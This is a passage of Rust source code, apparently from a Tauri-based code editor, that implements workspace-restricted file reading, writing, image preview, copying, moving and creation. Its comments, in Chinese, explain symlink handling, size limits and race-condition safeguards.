                        Ok(meta) if probe != rebuilt && !meta.is_dir() => {
                            return Err(crate::error_proto::coded("path_outside_workspace", path))
                        }
                        Ok(_) => {}
                        Err(e) if e.kind() == std::io::ErrorKind::NotFound => break,
                        Err(_) => return Err(crate::error_proto::coded("path_unresolvable", path)),
                    }
                }
                check(&rebuilt)?;
                return Ok(rebuilt);
            }
            Err(_) => match ancestor.parent() {
                Some(parent) if parent != ancestor => {
                    if let Some(name) = ancestor.file_name() {
                        tail.push(name.to_os_string());
                    }
                    ancestor = parent.to_path_buf();
                }
                _ => return Err(crate::error_proto::coded("path_unresolvable", path)),
            },
        }
    }
}

/// 对「用户点选的那个目录项」授权，而不是它 canonicalize 后的目标。
/// 删除/重命名软链时应操作链接本身：旧实现把 link 解析成 target，
/// 删 link 实际删掉了 target，用户选中的条目还留在树上。
fn authorize_entry_path(
    registry: &WorkspaceRegistry,
    path: &str,
    need_write: bool,
) -> Result<PathBuf, String> {
    let raw = Path::new(path);
    let is_link = fs::symlink_metadata(raw)
        .map(|m| m.file_type().is_symlink())
        .unwrap_or(false);
    if !is_link {
        return authorize_workspace_path(registry, path, need_write);
    }
    let parent = raw
        .parent()
        .ok_or_else(|| crate::error_proto::coded("path_unresolvable", path))?;
    let parent_auth = authorize_workspace_path(registry, &parent.to_string_lossy(), need_write)?;
    let name = raw
        .file_name()
        .ok_or_else(|| crate::error_proto::coded("path_unresolvable", path))?;
    Ok(parent_auth.join(name))
}

#[derive(Serialize, Deserialize, Debug, Clone)]
#[serde(rename_all = "camelCase")]
pub struct FileTextDto {
    pub text: String,
    /// 保存时优先沿用：UTF-8 / UTF-16LE / GBK / windows-1252…
    pub encoding: String,
}

#[tauri::command]
pub async fn read_file_content(
    path: String,
    force: Option<bool>,
    registry: tauri::State<'_, WorkspaceRegistry>,
    cache: tauri::State<'_, crate::file_cache::FileCache>,
) -> Result<String, String> {
    Ok(
        read_file_text_impl(&path, force.unwrap_or(false), &registry, Some(&cache))
            .await?
            .text,
    )
}

/// 编辑器打开文件使用：返回文本 + 实际编码，保存时按同一编码回写。
#[tauri::command]
pub async fn read_file_text(
    path: String,
    force: Option<bool>,
    registry: tauri::State<'_, WorkspaceRegistry>,
    cache: tauri::State<'_, crate::file_cache::FileCache>,
) -> Result<FileTextDto, String> {
    read_file_text_impl(&path, force.unwrap_or(false), &registry, Some(&cache)).await
}

/// 编辑器直接打开的软上限：超过即拒绝并返回 `file_too_large`（前端弹
/// 「在文件管理器中显示 / 仍要打开」）。8MB 的选取：Monaco 在此量级以上
/// tokenization 降级、JSON 往返四重复制（Rust String → serde → JS string →
/// model）已达数十 MB，误触大日志/core dump 足以拖死机器。
pub(crate) const MAX_READ_FILE_BYTES: u64 = 8 * 1024 * 1024;
/// `force=true`（用户显式确认）也绕不过的硬上限：256MB 以上任何编辑器
/// 路径都无意义，直接拒绝。防的是「用户手滑点仍要打开 4GB 文件」。
pub(crate) const MAX_READ_FILE_BYTES_FORCE: u64 = 256 * 1024 * 1024;

/// 字节数的人类可读形态（错误 detail 用，不进翻译字典）。
pub(crate) fn format_bytes(n: u64) -> String {
    const KB: u64 = 1024;
    const MB: u64 = 1024 * KB;
    const GB: u64 = 1024 * MB;
    if n >= GB {
        format!("{:.1} GB", n as f64 / GB as f64)
    } else if n >= MB {
        format!("{:.1} MB", n as f64 / MB as f64)
    } else if n >= KB {
        format!("{:.1} KB", n as f64 / KB as f64)
    } else {
        format!("{n} B")
    }
}

/// 文本读取的无状态实现（供测试直接调用，不必构造 Tauri State）。
/// `cache` 为 None 时退化为直读盘；命令入口传 `Some` 接读穿缓存。
async fn read_file_text_impl(
    path: &str,
    force: bool,
    registry: &WorkspaceRegistry,
    cache: Option<&crate::file_cache::FileCache>,
) -> Result<FileTextDto, String> {
    // 编辑器打开文件都走这里，网络盘 / 大文件上 read_to_string 可达几十毫秒，
    // 同步执行会占住 ipc worker，期间所有命令一起排队。
    // 丢到 blocking 池让 worker 立刻脱身（与 read_directory 同一模式）。
    let authorized = authorize_workspace_path(registry, path, false)?;
    // metadata 预检：大文件在读入内存之前就拒绝。TOCTOU（预检与读取之间
    // 文件变大）由 blocking 任务内的二次检查收敛 —— 窗口只剩任务排队时长，
    // 对本地 IDE 可忽略；二次检查失败同样走 file_too_large。
    //
    // 预检的 stat 顺手做缓存 key 的一半：命中即省一次读盘（外部变更检测/
    // 重开标签这类"读了八成没变"的高频路径）。miss 不改变任何行为。
    let precheck = std::fs::metadata(&authorized)
        .ok()
        .map(|m| (m.len(), crate::file_cache::mtime_ms_of(&m)));
    if let Some((len, _)) = precheck {
        let limit = if force {
            MAX_READ_FILE_BYTES_FORCE
        } else {
            MAX_READ_FILE_BYTES
        };
        if len > limit {
            return Err(crate::error_proto::coded(
                "file_too_large",
                format!("{} ({})", path, format_bytes(len)),
            ));
        }
    }
    if !force {
        if let (Some(c), Some((len, mtime_ms))) = (cache, precheck) {
            if let Some(hit) = c.get(&authorized, len, mtime_ms) {
                return Ok(FileTextDto {
                    text: hit.to_string(),
                    encoding: "UTF-8".to_string(),
                });
            }
        }
    }
    let owned = authorized.to_string_lossy().to_string();
    let path_owned = path.to_string();
    let content = tauri::async_runtime::spawn_blocking(move || {
        // 二次检查：收敛预检与读取之间的 TOCTOU 窗口。
        if let Ok(meta) = std::fs::metadata(&owned) {
            let limit = if force {
                MAX_READ_FILE_BYTES_FORCE
            } else {
                MAX_READ_FILE_BYTES
            };
            if meta.len() > limit {
                return Err(crate::error_proto::coded(
                    "file_too_large",
                    format!("{} ({})", path_owned, format_bytes(meta.len())),
                ));
            }
        }
        let bytes =
            fs::read(&owned).map_err(|e| format!("Failed to read {}: {}", path_owned, e))?;
        let decoded = crate::file_encoding::decode_text(&bytes);
        Ok::<_, String>(FileTextDto {
            text: decoded.text,
            encoding: decoded.encoding,
        })
    })
    .await
    .map_err(|e| format!("read_file_content 任务失败: {e}"))??;
    // 读穿回填：存入前复核 stat——预检与本次读取之间文件若被改过，
    // 复核值与预检对不上就丢弃这次存入（见 file_cache.rs），绝不缓存错版本。
    // force 读（可达 256MB）不进缓存：一条就能吃掉全部预算。
    if !force {
        if let Some(c) = cache {
            if let Ok(meta) = std::fs::metadata(&authorized) {
                let len = meta.len();
                let mtime_ms = crate::file_cache::mtime_ms_of(&meta);
                let matches_precheck = precheck
                    .map(|(pl, pm)| pl == len && pm == mtime_ms)
                    .unwrap_or(false);
                // 只缓存 UTF-8：非 UTF-8 解码结果需要编码标签，缓存层没有
                // 第二字段，宁可下次重读，也不返回错误编码。
                if matches_precheck && content.encoding == "UTF-8" {
                    c.insert(
                        authorized.clone(),
                        len,
                        mtime_ms,
                        std::sync::Arc::from(content.text.as_str()),
                    );
                }
            }
        }
    }
    Ok(content)
}

/// 兼容旧测试：只取文本，不暴露编码。
#[cfg(test)]
async fn read_file_content_impl(
    path: &str,
    force: bool,
    registry: &WorkspaceRegistry,
    cache: Option<&crate::file_cache::FileCache>,
) -> Result<String, String> {
    Ok(read_file_text_impl(path, force, registry, cache)
        .await?
        .text)
}

#[tauri::command]
pub async fn write_file_content(
    path: String,
    content: String,
    registry: tauri::State<'_, WorkspaceRegistry>,
    cache: tauri::State<'_, crate::file_cache::FileCache>,
) -> Result<(), String> {
    write_file_content_impl(&path, content, None, &registry, Some(&cache)).await
}

/// 按打开文件时检测到的编码回写；encoding 为空/UTF-8 时与 write_file_content 等价。
#[tauri::command]
pub async fn write_file_text(
    path: String,
    content: String,
    encoding: Option<String>,
    registry: tauri::State<'_, WorkspaceRegistry>,
    cache: tauri::State<'_, crate::file_cache::FileCache>,
) -> Result<(), String> {
    write_file_content_impl(&path, content, encoding.as_deref(), &registry, Some(&cache)).await
}

/// `write_file_content` 的无状态实现。成功后清掉该路径的缓存条目——
///
/// 不清，下一次读会命中写之前的旧版本（key 的 mtime 已变其实不会命中，
/// 但显式失效不依赖"mtime 一定前进"：某些文件系统/快速连续写 mtime
/// 粒度不够，宁可多一次读盘，不返回疑似过期内容）。
async fn write_file_content_impl(
    path: &str,
    content: String,
    encoding: Option<&str>,
    registry: &WorkspaceRegistry,
    cache: Option<&crate::file_cache::FileCache>,
) -> Result<(), String> {
    // 保存文件与读取同源：磁盘 IO 不该占住 ipc worker。
    let authorized = authorize_workspace_path(registry, path, true)?;
    let owned = authorized.to_string_lossy().to_string();
    let path_owned = path.to_string();
    let bytes = crate::file_encoding::encode_text(&content, encoding)?;
    tauri::async_runtime::spawn_blocking(move || {
        crate::file_encoding::atomic_write(std::path::Path::new(&owned), &bytes)
    })
    .await
    .map_err(|e| format!("write_file_text 任务失败: {e}"))?
    .map_err(|e| format!("Failed to write {}: {}", path_owned, e))?;
    if let Some(c) = cache {
        c.invalidate(&authorized);
    }
    Ok(())
}

// ============ 项目树文件系统操作（对齐 PyCharm 项目右键菜单） ============

#[derive(serde::Serialize, serde::Deserialize, Debug, Clone)]
#[serde(rename_all = "camelCase")]
pub struct ImageBytesDto {
    pub mime: String,
    pub base64: String,
    pub size: u64,
}

/// 图片扩展名 → MIME 白名单（`read_image_bytes` 专用）。
///
/// 只放行浏览器 `<img>` 可渲染的静态格式；`svg` 在 `<img>` 上下文不执行脚本
/// （无脚本能力，与脚本化的内联 SVG 是两回事），故可留。其它一律
/// `not_an_image` —— 可执行文件改个扩展名骗不过这一关（同时也防
/// `write_file_content` 写出的东西被当成图片解码）。
fn image_mime_for(path: &std::path::Path) -> Option<&'static str> {
    match path
        .extension()
        .and_then(|e| e.to_str())
        .map(|e| e.to_ascii_lowercase())
        .as_deref()
    {
        Some("png") => Some("image/png"),
        Some("jpg" | "jpeg") => Some("image/jpeg"),
        Some("gif") => Some("image/gif"),
        Some("webp") => Some("image/webp"),
        Some("bmp") => Some("image/bmp"),
        Some("svg") => Some("image/svg+xml"),
        Some("ico") => Some("image/x-icon"),
        Some("avif") => Some("image/avif"),
        _ => None,
    }
}

/// 无依赖的 base64 编码（标准表，带 `=` 填充）。
///
/// 不引入 base64 crate 只为这一个命令：编码 20 行写完，零依赖、零供应链面。
/// 正确性由同文件单测锁定（含 1/2/3 字节的填充边界）。
pub(crate) fn base64_encode(bytes: &[u8]) -> String {
    const TABLE: &[u8; 64] = b"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
    let mut out = String::with_capacity(bytes.len().div_ceil(3) * 4);
    for chunk in bytes.chunks(3) {
        let b0 = chunk[0] as u32;
        let b1 = *chunk.get(1).unwrap_or(&0) as u32;
        let b2 = *chunk.get(2).unwrap_or(&0) as u32;
        let n = (b0 << 16) | (b1 << 8) | b2;
        out.push(TABLE[((n >> 18) & 63) as usize] as char);
        out.push(TABLE[((n >> 12) & 63) as usize] as char);
        if chunk.len() > 1 {
            out.push(TABLE[((n >> 6) & 63) as usize] as char);
        } else {
            out.push('=');
        }
        if chunk.len() > 2 {
            out.push(TABLE[(n & 63) as usize] as char);
        } else {
            out.push('=');
        }
    }
    out
}

/// 以 data URL 形态读取工作区内图片（编辑器图片预览 / Markdown 本地图片）。
///
/// 存在理由（P2-asset）：此前图片走 `convertFileSrc`（asset:// 协议），
/// 其 scope 放了 `$HOME/**` —— 任何未来的 XSS 都能读 `~/.ssh/`。
/// 本命令把图片读取收敛到「授权 + 白名单 + 上限」三件套，前端拿 base64
/// 拼 data URL，不再经过 asset 协议；tauri.conf 的 scope 随后收掉 `$HOME`。
///
/// 上限与文本同口径（8MB，无 force 通道 —— 纯查看场景，超限请用
/// fs_reveal 到系统看图工具打开）。SVG 允许：`<img>` 上下文无脚本能力。
#[tauri::command]
pub async fn read_image_bytes(
    path: String,
    registry: tauri::State<'_, WorkspaceRegistry>,
) -> Result<ImageBytesDto, String> {
    let authorized = authorize_workspace_path(&registry, &path, false)?;
    let mime = image_mime_for(&authorized)
        .ok_or_else(|| crate::error_proto::coded("not_an_image", &path))?;
    let mime = mime.to_string();
    let path_owned = path.clone();
    tauri::async_runtime::spawn_blocking(move || {
        if let Ok(meta) = std::fs::metadata(&authorized) {
            if meta.len() > MAX_READ_FILE_BYTES {
                return Err(crate::error_proto::coded(
                    "file_too_large",
                    format!("{} ({})", path_owned, format_bytes(meta.len())),
                ));
            }
        }
        let bytes = std::fs::read(&authorized)
            .map_err(|e| format!("Failed to read {}: {}", path_owned, e))?;
        if bytes.len() as u64 > MAX_READ_FILE_BYTES {
            return Err(crate::error_proto::coded(
                "file_too_large",
                format!("{} ({})", path_owned, format_bytes(bytes.len() as u64)),
            ));
        }
        let size = bytes.len() as u64;
        Ok(ImageBytesDto {
            mime,
            base64: base64_encode(&bytes),
            size,
        })
    })
    .await
    .map_err(|e| format!("read_image_bytes 任务失败: {e}"))?
}

/// 在 dir 下**原子抢占**一个不冲突的目标路径（对齐 Finder 的 " copy"/" copy 2"）。
///
/// 旧实现是「检查 exists → 返回路径」：两个并发粘贴可能选中同一个名字并互相
/// 覆盖（check-then-create 竞态）。这里把「选名字」与「占位」合并成一步原子
/// 操作 —— 文件用 `create_new`、目录用 `create_dir`，成功即锁定该名字，
/// 失败（已存在）就换下一个候选名。返回的占位由调用方覆盖或复用。
fn reserve_destination(dir: &Path, name: &str, is_dir: bool) -> Result<PathBuf, String> {
    let (stem, ext) = match name.rfind('.') {
        Some(dot) if dot > 0 => (name[..dot].to_string(), name[dot..].to_string()),
        _ => (name.to_string(), String::new()),
    };

    let mut candidates = Vec::with_capacity(1002);
    candidates.push(dir.join(name));
    for i in 1..1000 {
        let suffix = if i == 1 {
            " copy".to_string()
        } else {
            format!(" copy {}", i)
        };
        candidates.push(dir.join(format!("{}{}{}", stem, suffix, ext)));
    }
    // 兜底：1000 个候选名都被占了，用毫秒时间戳保证仍能落地
    let stamp = std::time::SystemTime::now()
        .duration_since(std::time::UNIX_EPOCH)
        .map(|d| d.as_millis())
        .unwrap_or(0);
    candidates.push(dir.join(format!("{} copy {}{}", stem, stamp, ext)));

    for candidate in &candidates {
        let reserved = if is_dir {
            fs::create_dir(candidate)
        } else {
            fs::OpenOptions::new()
                .write(true)
                .create_new(true)
                .open(candidate)
                .map(|_| ())
        };
        match reserved {
            Ok(()) => return Ok(candidate.clone()),
            Err(e) if e.kind() == std::io::ErrorKind::AlreadyExists => continue,
            Err(e) => {
                return Err(crate::error_proto::coded_display(
                    "create_target_failed",
                    format!("{} ({})", candidate.display(), e),
                ))
            }
        }
    }
    Err(crate::error_proto::coded(
        "no_available_target_name",
        dir.display().to_string(),
    ))
}

/// 为软链复制选一个不存在的目标名（不创建占位；symlink 本身是原子创建）。
fn available_destination(dir: &Path, name: &str) -> Result<PathBuf, String> {
    let (stem, ext) = match name.rfind('.') {
        Some(dot) if dot > 0 => (name[..dot].to_string(), name[dot..].to_string()),
        _ => (name.to_string(), String::new()),
    };
    let mut candidates = vec![dir.join(name)];
    for i in 1..1000 {
        let suffix = if i == 1 {
            " copy".to_string()
        } else {
            format!(" copy {i}")
        };
        candidates.push(dir.join(format!("{stem}{suffix}{ext}")));
    }
    for candidate in candidates {
        if fs::symlink_metadata(&candidate).is_err() {
            return Ok(candidate);
        }
    }
    Err(crate::error_proto::coded(
        "no_available_target_name",
        dir.display().to_string(),
    ))
}

/// 目录树复制的结果，用于「先完整复制、校验通过、再删源」。
#[derive(Default, Clone, Copy)]
struct CopyStats {
    /// 源侧条目数（目录 + 文件 + 软链 + 其它），不含根自身
    entries: u64,
    /// 已复制的文件总字节数（软链不参与，跨平台可比）
    bytes: u64,
    /// 因平台/类型无法复制而被跳过的条目数
    skipped: u64,
}

impl CopyStats {
    fn merge(&mut self, other: CopyStats) {
        self.entries += other.entries;
        self.bytes += other.bytes;
        self.skipped += other.skipped;
    }
}

/// 统计目录树的条目数与文件总字节数（**不跟随**符号链接：软链按 1 个条目计，
/// 不计字节），作为复制完整性的对照基线。
fn dir_tree_stats(root: &Path) -> Result<(u64, u64), String> {
    fn walk(dir: &Path, entries: &mut u64, bytes: &mut u64) -> Result<(), String> {
        for entry in
            fs::read_dir(dir).map_err(|e| format!("读取目录失败 {}: {}", dir.display(), e))?
        {
            let entry = entry.map_err(|e| format!("遍历目录失败: {}", e))?;
            let file_type = entry
                .file_type()
                .map_err(|e| format!("读取类型失败: {}", e))?;
            *entries += 1;
            if file_type.is_dir() {
                walk(&entry.path(), entries, bytes)?;
            } else if file_type.is_file() {
                *bytes += entry
                    .metadata()
                    .map_err(|e| format!("读取元数据失败: {}", e))?
                    .len();
            }
        }
        Ok(())
    }
    let mut entries = 0;
    let mut bytes = 0;
    walk(root, &mut entries, &mut bytes)?;
    Ok((entries, bytes))
}

/// 复制一个符号链接本身（重建链接，而不是把目标内容拷成普通文件）。
///
/// 目标路径原样（含相对目标）写入，链接语义与源完全一致。
#[cfg(unix)]
fn copy_symlink(link: &Path, target: &Path) -> Result<(), String> {
    let resolved =
        fs::read_link(link).map_err(|e| format!("读取符号链接失败 {}: {}", link.display(), e))?;
    std::os::unix::fs::symlink(&resolved, target)
        .map_err(|e| format!("复制符号链接失败 {}: {}", link.display(), e))
}

/// Windows 的软链创建 API 必须区分目录/文件链接，且普通用户默认需要
/// 开发者模式；两者都失败时报错（调用方会放弃删除源）。
#[cfg(windows)]
fn copy_symlink(link: &Path, target: &Path) -> Result<(), String> {
    let resolved =
        fs::read_link(link).map_err(|e| format!("读取符号链接失败 {}: {}", link.display(), e))?;
    // 用 metadata（跟随）判断链接目标类型；目标已失效时按文件链接处理
    let points_to_dir = fs::metadata(link).map(|m| m.is_dir()).unwrap_or(false);
    let created = if points_to_dir {
        std::os::windows::fs::symlink_dir(&resolved, target)
    } else {
        std::os::windows::fs::symlink_file(&resolved, target)
    };
    created.map_err(|e| {
        format!(
            "复制符号链接失败 {}（需要开发者模式或管理员权限）: {}",
            link.display(),
            e
        )
    })
}

/// 其它平台没有可用的软链重建接口：明确失败，让调用方保留源目录。
#[cfg(not(any(unix, windows)))]
fn copy_symlink(link: &Path, target: &Path) -> Result<(), String> {
    let _ = target;
    Err(crate::error_proto::coded(
        "symlink_copy_unsupported",
        link.display().to_string(),
    ))
}

/// 递归复制目录树（文件 + 软链），返回复制统计供「删源前校验」使用。
///
/// 旧实现只认 `is_dir` / `is_file`：`file_type()` 不跟随软链，软链两类都不占，
/// 于是被静默跳过 —— 而跨设备移动随后仍 `remove_dir_all(src)`，源里的软链
/// 连同目标端缺失的副本一起消失，不可恢复。
fn copy_dir_recursive(src: &Path, dst: &Path) -> Result<CopyStats, String> {
    let mut stats = CopyStats::default();
    fs::create_dir_all(dst).map_err(|e| format!("创建目录失败 {}: {}", dst.display(), e))?;
    let entries =
        fs::read_dir(src).map_err(|e| format!("读取目录失败 {}: {}", src.display(), e))?;
    for entry in entries {
        let entry = entry.map_err(|e| format!("遍历目录失败: {}", e))?;
        let file_type = entry
            .file_type()
            .map_err(|e| format!("读取类型失败: {}", e))?;
        let target = dst.join(entry.file_name());
        stats.entries += 1;
        if file_type.is_dir() {
            stats.merge(copy_dir_recursive(&entry.path(), &target)?);
        } else if file_type.is_file() {
            let copied = fs::copy(entry.path(), &target)
                .map_err(|e| format!("复制文件失败 {}: {}", entry.path().display(), e))?;
            stats.bytes += copied;
        } else if file_type.is_symlink() {
            copy_symlink(&entry.path(), &target)?;
        } else {
            // fifo / socket / 设备节点：没有普通文件语义可复制。跳过但记账，
            // 让跨设备移动据此拒绝删除源（宁可不移动，也不能丢数据）。
            stats.skipped += 1;
        }
    }
    Ok(stats)
}

/// 复制目录树并在**删除源之前**校验完整性，校验不通过则报错且不碰源。
///
/// 只比较条目数与文件总字节数（不跟随软链）：足以发现「软链被跳过」「fifo 等
/// 特殊条目没复制」「整棵子树复制中途失败」这类不完整结果，而这些正是旧实现
/// 会静默删源的场景。
fn copy_dir_verified(src: &Path, dst: &Path) -> Result<(), String> {
    let copied = copy_dir_recursive(src, dst)?;
    let (src_entries, src_bytes) = dir_tree_stats(src)?;
    if copied.skipped > 0 || copied.entries != src_entries || copied.bytes != src_bytes {
        return Err(format!(
            "移动已中止：{} 无法完整复制（跳过 {} 项，复制 {}/{} 项、{} / {} 字节），源目录已保留。请改用系统文件管理器移动",
            src.display(),
            copied.skipped,
            copied.entries,
            src_entries,
            copied.bytes,
            src_bytes
        ));
    }
    Ok(())
}

fn move_entry(src: &Path, dst: &Path) -> Result<(), String> {
    if fs::rename(src, dst).is_ok() {
        return Ok(());
    }
    // dst 是上层用 reserve_destination 抢占的占位；Windows 上 rename 不能覆盖
    // 已存在的目标，先撤掉占位再试（Unix 的 rename 直接覆盖空目录/空文件）。
    if fs::symlink_metadata(dst).is_ok() {
        let removed = if fs::symlink_metadata(dst)
            .map(|m| m.is_dir())
            .unwrap_or(false)
        {
            fs::remove_dir(dst)
        } else {
            fs::remove_file(dst)
        };
        if removed.is_err() {
            return Err(crate::error_proto::coded(
                "target_exists_no_overwrite",
                dst.display().to_string(),
            ));
        }
    }
    if fs::rename(src, dst).is_ok() {
        return Ok(());
    }

    // 跨文件系统 rename 会失败（EXDEV）：退回复制 + 校验 + 删源。
    // 关键顺序：先完整复制、比对条目数与字节数，确认一致后才碰源目录。
    let src_type =
        fs::symlink_metadata(src).map_err(|e| format!("读取源失败 {}: {}", src.display(), e))?;
    if src_type.is_dir() {
        copy_dir_verified(src, dst)?;
        fs::remove_dir_all(src).map_err(|e| format!("移动目录失败: {}", e))?;
    } else if src_type.is_file() {
        let copied = fs::copy(src, dst).map_err(|e| format!("移动文件失败: {}", e))?;
        if copied != src_type.len() {
            return Err(format!(
                "移动已中止：{} 复制字节数不符（{} / {}），源文件已保留",
                src.display(),
                copied,
                src_type.len()
            ));
        }
        fs::remove_file(src).map_err(|e| format!("移动文件失败: {}", e))?;
    } else if src_type.is_symlink() {
        copy_symlink(src, dst)?;
        fs::remove_file(src).map_err(|e| format!("移动符号链接失败: {}", e))?;
    } else {
        return Err(crate::error_proto::coded(
            "unsupported_entry_type",
            src.display().to_string(),
        ));
    }
    Ok(())
}

/// 临时文件：Drop 时自动删除。
///
/// 之前是「写文件 → 用完手工 remove_file」，任何 `?` 早退（git 命令失败等）
/// 都会跳过清理，把用户的源码 diff 永久留在 /tmp。RAII 让成功、错误早退、
/// panic 三条出口走同一条清理路径。
struct TempFile(PathBuf);

impl TempFile {
    fn new(path: PathBuf) -> Self {
        TempFile(path)
    }

    fn path(&self) -> &Path {
        &self.0
    }
}

impl Drop for TempFile {
    fn drop(&mut self) {
        let _ = fs::remove_file(&self.0);
    }
}

/// 用 O_EXCL 创建临时文件并写入：先建后写，不跟随预先埋好的同名软链。
fn write_temp_file(prefix: &str, bytes: &[u8]) -> Result<TempFile, String> {
    use std::io::Write;
    for _ in 0..64 {
        let unique = std::time::SystemTime::now()
            .duration_since(std::time::UNIX_EPOCH)
            .map(|d| d.as_nanos())
            .unwrap_or(0);
        let path =
            std::env::temp_dir().join(format!("{prefix}-{}-{unique}.tmp", std::process::id()));
        match fs::OpenOptions::new()
            .write(true)
            .create_new(true)
            .open(&path)
        {
            Ok(mut f) => {
                f.write_all(bytes)
                    .and_then(|_| f.sync_all())
                    .map_err(|e| format!("写入临时文件失败: {e}"))?;
                return Ok(TempFile::new(path));
            }
            Err(e) if e.kind() == std::io::ErrorKind::AlreadyExists => continue,
            Err(e) => return Err(format!("创建临时文件失败: {e}")),
        }
    }
    Err("无法创建唯一临时文件".to_string())
}

/// 用 create_dir（不跟随软链）创建 0700 临时目录，供 merge-file 三份输入。
fn create_private_temp_dir(prefix: &str) -> Result<PathBuf, String> {
    for _ in 0..64 {
        let unique = std::time::SystemTime::now()
            .duration_since(std::time::UNIX_EPOCH)
            .map(|d| d.as_nanos())
            .unwrap_or(0);
        let path = std::env::temp_dir().join(format!("{prefix}-{}-{unique}", std::process::id()));
        match fs::create_dir(&path) {
            Ok(()) => {
                #[cfg(unix)]
                {
                    use std::os::unix::fs::PermissionsExt;
                    fs::set_permissions(&path, fs::Permissions::from_mode(0o700))
                        .map_err(|e| format!("设置临时目录权限失败: {e}"))?;
                }
                return Ok(path);
            }
            Err(e) if e.kind() == std::io::ErrorKind::AlreadyExists => continue,
            Err(e) => return Err(format!("创建临时目录失败: {e}")),
        }
    }
    Err("无法创建唯一临时目录".to_string())
}

fn validate_entry_name(name: &str) -> Result<String, String> {
    let name = name.trim();
    if name.is_empty() {
        return Err(crate::error_proto::coded("name_empty", ""));
    }
    if name == "." || name == ".." || name.contains('/') || name.contains('\\') {
        return Err(crate::error_proto::coded("name_invalid", name));
    }
    Ok(name.to_string())
}

/// 新建文件允许带子目录（"pkg/main.go"），逐段校验
fn validate_relative_path(path: &str) -> Result<String, String> {
    let trimmed = path.trim().trim_matches('/');
    if trimmed.is_empty() {
        return Err(crate::error_proto::coded("name_empty", ""));
    }
    for seg in trimmed.split('/') {
        if seg.is_empty() || seg == "." || seg == ".." || seg.contains('\\') {
            return Err(crate::error_proto::coded("name_invalid", seg));
        }
    }
    Ok(trimmed.to_string())
}

/// 逐段拒绝软链组件：新建文件/目录时 `create_dir_all` 和 `write` 会
/// 顺着仓库里已存在的软链走，悬空链接因此能绕过 workspace 边界。
/// 名称已由 `validate_relative_path` 去掉 `..`，这里只逐个 lstat。
fn reject_symlink_components(base: &Path, rel: &str) -> Result<(), String> {
    let mut probe = base.to_path_buf();
    let last = rel.split('/').count();
    for (idx, seg) in rel.split('/').enumerate() {
        probe.push(seg);
        match fs::symlink_metadata(&probe) {
            Ok(meta) if meta.file_type().is_symlink() => {
                return Err(crate::error_proto::coded(
                    "path_outside_workspace",
                    probe.to_string_lossy(),
                ))
            }
            Ok(meta) if idx + 1 < last && !meta.is_dir() => {
                return Err(crate::error_proto::coded(
                    "path_outside_workspace",
                    probe.to_string_lossy(),
                ))
            }
            Ok(_) => {}
            Err(e) if e.kind() == std::io::ErrorKind::NotFound => break,
            Err(_) => {
                return Err(crate::error_proto::coded(
                    "path_unresolvable",
                    probe.to_string_lossy(),
                ))
            }
        }
    }
    Ok(())
}

/// 新建文件（name 允许带子目录 "pkg/main.go"，自动创建父目录）
#[tauri::command]
pub async fn fs_create_file(
    dir: String,
    name: String,
    registry: tauri::State<'_, WorkspaceRegistry>,
) -> Result<String, String> {
    fs_create_file_impl(&dir, &name, &registry).await
}

/// `fs_create_file` 的无状态实现：供测试直接调用。
async fn fs_create_file_impl(
    dir: &str,
    name: &str,
    registry: &WorkspaceRegistry,
) -> Result<String, String> {
    // fs 系列是纯磁盘 IO，机械盘 / 网络盘上单次调用可达几十毫秒；同步执行
    // 会占住 ipc worker。与 read_directory 统一迁到 blocking 池。
    let dir_auth = authorize_workspace_path(registry, dir, true)?;
    let name = name.to_string();
    let dir = dir.to_string();
    tauri::async_runtime::spawn_blocking(move || {
        let name = validate_relative_path(&name)?;
        if !dir_auth.is_dir() {
            return Err(crate::error_proto::coded("dir_not_found", dir));
        }
        reject_symlink_components(&dir_auth, &name)?;
        let target = dir_auth.join(&name);
        // exists() 跟随软链，悬空链接会返回 false；用 symlink_metadata 把链接
        // 本身也算作已存在。
        if fs::symlink_metadata(&target).is_ok() {
            return Err(crate::error_proto::coded("file_already_exists", name));
        }
        if let Some(parent) = target.parent() {
            fs::create_dir_all(parent).map_err(|e| format!("创建目录失败: {}", e))?;
        }
        // create_new 是 O_EXCL：即使授权与写入之间有人塞进软链也不会跟随。
        fs::OpenOptions::new()
            .write(true)
            .create_new(true)
            .open(&target)
            .map_err(|e| format!("创建文件失败: {}", e))?;
        Ok(target.to_string_lossy().to_string())
    })
    .await
    .map_err(|e| format!("fs_create_file 任务失败: {e}"))?
}

/// 新建目录
#[tauri::command]
pub async fn fs_create_directory(
    dir: String,
    name: String,
    registry: tauri::State<'_, WorkspaceRegistry>,
) -> Result<String, String> {
    fs_create_directory_impl(&dir, &name, &registry).await
}

/// `fs_create_directory` 的无状态实现。
async fn fs_create_directory_impl(
    dir: &str,
    name: &str,
    registry: &WorkspaceRegistry,
) -> Result<String, String> {
    // 同 fs_create_file：磁盘 IO 不占 ipc worker。
    let dir_auth = authorize_workspace_path(registry, dir, true)?;
    let name = name.to_string();
    let dir = dir.to_string();
    tauri::async_runtime::spawn_blocking(move || {
        let name = validate_entry_name(&name)?;
        if !dir_auth.is_dir() {
            return Err(crate::error_proto::coded("dir_not_found", dir));
        }
        reject_symlink_components(&dir_auth, &name)?;
        let target = dir_auth.join(&name);
        if fs::symlink_metadata(&target).is_ok() {
            return Err(crate::error_proto::coded("dir_already_exists", name));
        }
        fs::create_dir_all(&target).map_err(|e| format!("创建目录失败: {}", e))?;
        Ok(target.to_string_lossy().to_string())
    })
    .await
    .map_err(|e| format!("fs_create_directory 任务失败: {e}"))?
}

/// 重命名（同目录内改名，对齐 PyCharm Rename）
#[tauri::command]
pub async fn fs_rename(
    path: String,
    new_name: String,
    registry: tauri::State<'_, WorkspaceRegistry>,
) -> Result<String, String> {
    fs_rename_impl(&path, &new_name, &registry).await
}

/// `fs_rename` 的无状态实现。
async fn fs_rename_impl(
    path: &str,
    new_name: &str,
    registry: &WorkspaceRegistry,
) -> Result<String, String> {
    // 同 fs_create_file：磁盘 IO 不占 ipc worker。
    let src_auth = authorize_entry_path(registry, path, true)?;
    let new_name = new_name.to_string();
    let path = path.to_string();
    tauri::async_runtime::spawn_blocking(move || {
        let new_name = validate_entry_name(&new_name)?;
        if fs::symlink_metadata(&src_auth).is_err() {
            return Err(crate::error_proto::coded("path_not_found", path));
        }
        if src_auth
            .file_name()
            .map(|n| n.to_string_lossy() == new_name)
            .unwrap_or(false)
        {
            return Ok(path.to_string());
        }
        let parent = src_auth
            .parent()
            .ok_or_else(|| "无法获取父目录".to_string())?;
        let dst = parent.join(&new_name);
        if fs::symlink_metadata(&dst).is_ok() {
            return Err(crate::error_proto::coded("already_exists", new_name));
